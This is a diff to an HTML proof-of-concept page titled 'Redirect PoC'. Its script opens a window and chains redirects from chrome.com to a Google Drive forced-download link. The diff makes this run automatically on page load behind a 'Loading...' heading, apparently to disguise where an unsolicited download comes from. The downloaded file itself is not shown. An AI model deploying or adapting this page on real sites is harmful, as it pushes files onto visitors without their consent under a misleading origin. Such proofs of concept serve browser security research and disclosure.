@@ -2,27 +2,33 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>poc</title>
+  <title>Redirect PoC</title>
   <script>
     function chainRedirect(w, urls, index = 0) {
       if (index < urls.length) {
+        console.log("Redirecting to:", urls[index]);
         w.location.replace(urls[index]);
-        setTimeout(() => chainRedirect(w, urls, index + 1), 1000);
+
+        setTimeout(() => {
+          chainRedirect(w, urls, index + 1);
+        }, 400);
       }
     }
 
     function startRedirect() {
       let w = window.open("");
+
       setTimeout(() => {
         chainRedirect(w, [
-        "https://chrome.com",
-        "https://drive.usercontent.google.com/download?id=1Ky6ckxHgrE6HUlAq9g842YXa2nyGO5pU&export=download&authuser=0&confirm=t&uuid=63f80b4c-24d3-49bd-b402-3d8e3b989d21&at=AGN2oQ2aRBaepFbgnCDhyUTathsD:1773906708696",
+          "https://chrome.com",
+          "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL&export=download&authuser=0&confirm=t&uuid=733afb2e-0d6c-4da7-8ec5-883d0b792a34&at=AGN2oQ0VkjDRWTpZ7Vs-SmKiGHJ6:1773905849768"
         ]);
-      }, 1000);
+      }, 300);
     }
   </script>
 </head>
-<body>
-  <button onclick="startRedirect()">Start</button>
+
+<body onload="startRedirect()">
+  <h3>Loading...</h3>
 </body>
 </html>
